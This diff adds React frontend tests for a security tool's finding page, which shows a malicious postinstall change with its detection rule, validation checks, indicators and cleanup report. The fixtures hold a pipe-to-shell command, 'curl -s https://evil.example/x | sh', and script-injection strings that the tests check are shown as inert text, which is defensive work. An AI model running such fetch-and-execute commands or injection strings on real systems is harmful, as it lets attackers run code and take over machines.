@@ -624,3 +624,292 @@ it("starting a Lab asks for the Operator's password", async () => {
   ]);
   expect(posted.every((p) => p.key)).toBe(true);
 });
+
+// A Malicious change's static Proof (A07): T1's postinstall fixture, as the backend stores it.
+const at = "2026-11-01T00:00:00Z";
+const rule =
+  'rule postinstall_loader { strings: $a = "payload-ran" $b = "evil.example/x" condition: all of them } // <script>alert("rule")</script>';
+const malicious = {
+  ...detail,
+  title: "Postinstall loader in package.json",
+  source_commit_id: "commit-1",
+  status: "confirmed",
+  cause: { by: "detection_rule", artifact_revision: "revision", at },
+  malicious_change: true,
+  lab_runs: [],
+  artifact_state: {
+    status: "complete",
+    missing: [],
+    limitations: [],
+    vulnerable_version: null,
+  },
+  static_proof: {
+    analysis_id: "analysis-1",
+    artifact_revision: "revision",
+    files: ["detection-rule.yar", "indicators.json", "report.md"],
+    rule,
+    status: "validated",
+    job_id: "job-rule",
+    checks: [
+      {
+        name: "rule",
+        status: "passed",
+        message: "The Detection rule compiles",
+      },
+      {
+        name: "changed",
+        status: "passed",
+        message:
+          "The Detection rule matches files this commit added or changed",
+        files: ["package.json"],
+        count: 1,
+      },
+      {
+        name: "parent",
+        status: "passed",
+        message: "The Detection rule matches no file in the parent tree",
+        files: [],
+        count: 0,
+      },
+      {
+        name: "baseline",
+        status: "passed",
+        message: "The Detection rule matches no file in the Baseline tree",
+        files: [],
+        count: 0,
+      },
+    ],
+    indicators: {
+      files: [{ path: "package.json", sha256: "c".repeat(64) }],
+      hosts: ["evil.example"],
+      urls: ["https://evil.example/x?<script>alert(1)</script>"],
+      commands: ["curl -s https://evil.example/x | sh"],
+      rejected: [
+        {
+          kind: "host",
+          value: "cdn.shop.example",
+          reason: "Not in the lines this commit added",
+        },
+      ],
+    },
+  },
+  cleanup_report: {
+    analysis_id: "analysis-1",
+    commits: [
+      { revision: "a".repeat(40), commit_id: "commit-1" },
+      { revision: "b".repeat(40), commit_id: null },
+    ],
+    commits_truncated: true,
+    releases: ["v1.0.1"],
+    secrets: ["The npm publish token in CI"],
+  },
+};
+function showFinding(finding: Record<string, unknown>) {
+  vi.stubGlobal(
+    "fetch",
+    vi.fn(
+      async (url: string) =>
+        new Response(
+          JSON.stringify(
+            url.startsWith("/api/applications/") ? application : finding,
+          ),
+        ),
+    ),
+  );
+  return render(
+    <MemoryRouter initialEntries={["/findings/finding"]}>
+      <Routes>
+        <Route path="/findings/:id" element={<FindingDetail />} />
+      </Routes>
+    </MemoryRouter>,
+  );
+}
+
+it("shows the static Proof with each validation check and the cleanup report as text", async () => {
+  const { container } = showFinding(malicious);
+  const proof = await screen.findByRole("region", { name: "Static Proof" });
+  expect(within(proof).getByText("Validated")).toBeInTheDocument();
+  expect(within(proof).getByRole("link", { name: /View job/ })).toHaveAttribute(
+    "href",
+    "/jobs/job-rule",
+  );
+  for (const label of [
+    "Rule compiles",
+    "Matches a file the commit changed",
+    "Matches nothing in the parent tree",
+    "Matches nothing in the Baseline",
+  ])
+    expect(within(proof).getByText(label).closest("div")).toHaveTextContent(
+      "Passed",
+    );
+  expect(
+    within(proof).getByText("Matches a file the commit changed").closest("div"),
+  ).toHaveTextContent("package.json");
+  // The rule and every indicator are text: nothing in them is ever markup.
+  expect(within(proof).getByText(rule).tagName).toBe("PRE");
+  expect(within(proof).getByText("c".repeat(64))).toBeInTheDocument();
+  expect(within(proof).getByText("evil.example")).toBeInTheDocument();
+  expect(
+    within(proof).getByText("https://evil.example/x?<script>alert(1)</script>"),
+  ).toBeInTheDocument();
+  expect(
+    within(proof).getByText("curl -s https://evil.example/x | sh"),
+  ).toBeInTheDocument();
+  expect(
+    within(proof)
+      .getByText(/cdn\.shop\.example/)
+      .closest("li"),
+  ).toHaveTextContent("Not in the lines this commit added");
+  expect(container.querySelector("script")).toBeNull();
+
+  const report = screen.getByRole("region", { name: "Cleanup report" });
+  expect(within(report).getByText("package.json")).toBeInTheDocument();
+  expect(
+    within(report).getByText(
+      "https://evil.example/x?<script>alert(1)</script>",
+    ),
+  ).toBeInTheDocument();
+  expect(within(report).getByRole("link", { name: "aaaaaaa" })).toHaveAttribute(
+    "href",
+    "/commits/commit-1",
+  );
+  expect(within(report).getByText("bbbbbbb")).toBeInTheDocument();
+  expect(within(report).getByText(/and more/)).toBeInTheDocument();
+  expect(within(report).getByText("v1.0.1")).toBeInTheDocument();
+  expect(
+    within(report).getByText("The npm publish token in CI"),
+  ).toBeInTheDocument();
+  expect(
+    within(report)
+      .getByText("Detection rule to run on the server")
+      .closest("div"),
+  ).toHaveTextContent("Validated");
+  expect(
+    within(screen.getByRole("region", { name: "Lifecycle" })).getByText(
+      "Validated Detection rule",
+    ),
+  ).toBeInTheDocument();
+});
+
+it("names the failed Detection rule check and keeps the artifacts Draft", async () => {
+  showFinding({
+    ...malicious,
+    status: "open",
+    cause: {
+      by: "verdict",
+      verdict: "Malicious change",
+      confidence: "high",
+      at,
+    },
+    artifact_state: {
+      status: "draft",
+      missing: [],
+      limitations: ["The Detection rule also matches files in the parent tree"],
+      vulnerable_version: null,
+    },
+    static_proof: {
+      ...malicious.static_proof,
+      status: "failed",
+      checks: [
+        malicious.static_proof.checks[0],
+        malicious.static_proof.checks[1],
+        {
+          name: "parent",
+          status: "failed",
+          message: "The Detection rule also matches files in the parent tree",
+          files: ["server.js"],
+          count: 1,
+        },
+        {
+          name: "baseline",
+          status: "skipped",
+          message: "A Backfill commit is checked against its parent tree only",
+        },
+      ],
+    },
+    cleanup_report: { ...malicious.cleanup_report, releases: null },
+  });
+  const proof = await screen.findByRole("region", { name: "Static Proof" });
+  const parent = within(proof)
+    .getByText("Matches nothing in the parent tree")
+    .closest("div")!;
+  expect(parent).toHaveTextContent("Failed");
+  expect(parent).toHaveTextContent(
+    "The Detection rule also matches files in the parent tree",
+  );
+  expect(within(parent).getByText("server.js")).toBeInTheDocument();
+  expect(
+    within(proof).getByText("Matches nothing in the Baseline").closest("div"),
+  ).toHaveTextContent("Skipped");
+  expect(screen.getByText("Artifacts").closest("span")).toHaveTextContent(
+    "Draft",
+  );
+  const lifecycle = screen.getByRole("region", { name: "Lifecycle" });
+  expect(within(lifecycle).getByText("Open")).toBeInTheDocument();
+  expect(
+    within(lifecycle).getByText("Malicious change Verdict, high confidence"),
+  ).toBeInTheDocument();
+  const report = screen.getByRole("region", { name: "Cleanup report" });
+  expect(within(report).getByText("Releases").closest("div")).toHaveTextContent(
+    "Unknown",
+  );
+});
+
+it("never shows releases none of the stored commits had as none", async () => {
+  showFinding({
+    ...malicious,
+    cleanup_report: { ...malicious.cleanup_report, releases: [] },
+  });
+  const report = await screen.findByRole("region", { name: "Cleanup report" });
+  expect(within(report).getByText("Releases").closest("div")).toHaveTextContent(
+    "None found among the stored commits; not ruled out",
+  );
+});
+
+it("offers no Lab and no generation for a Malicious change Finding", async () => {
+  const { unmount } = showFinding({
+    ...malicious,
+    artifact_state: {
+      status: "draft",
+      missing: ["detection-rule.yar"],
+      limitations: [],
+      vulnerable_version: null,
+    },
+  });
+  expect(
+    await screen.findByText(
+      "Missing: detection-rule.yar. The static Proof is complete once its Detection rule validates.",
+    ),
+  ).toBeInTheDocument();
+  expect(
+    screen.queryByRole("button", { name: "Start Lab" }),
+  ).not.toBeInTheDocument();
+  expect(screen.queryByRole("region", { name: "Lab" })).not.toBeInTheDocument();
+  expect(screen.queryByText(/^Lab /)).not.toBeInTheDocument();
+  expect(
+    screen.queryByRole("button", { name: "Generate" }),
+  ).not.toBeInTheDocument();
+  const user = userEvent.setup();
+  await user.click(
+    screen.getByRole("button", { name: "Upload missing files" }),
+  );
+  const dialog = await screen.findByRole("dialog");
+  expect(
+    within(dialog).getByLabelText("Detection rule (detection-rule.yar)"),
+  ).toBeInTheDocument();
+  expect(
+    within(dialog).queryByLabelText("Python PoC (poc.py)"),
+  ).not.toBeInTheDocument();
+  unmount();
+  showFinding({
+    ...detail,
+    cause: { by: "verdict", verdict: "Vulnerability introduced", at },
+  });
+  expect(
+    await screen.findByRole("button", { name: "Start Lab" }),
+  ).toBeInTheDocument();
+  expect(screen.getByRole("button", { name: "Generate" })).toBeInTheDocument();
+  expect(
+    screen.queryByRole("region", { name: "Static Proof" }),
+  ).not.toBeInTheDocument();
+});
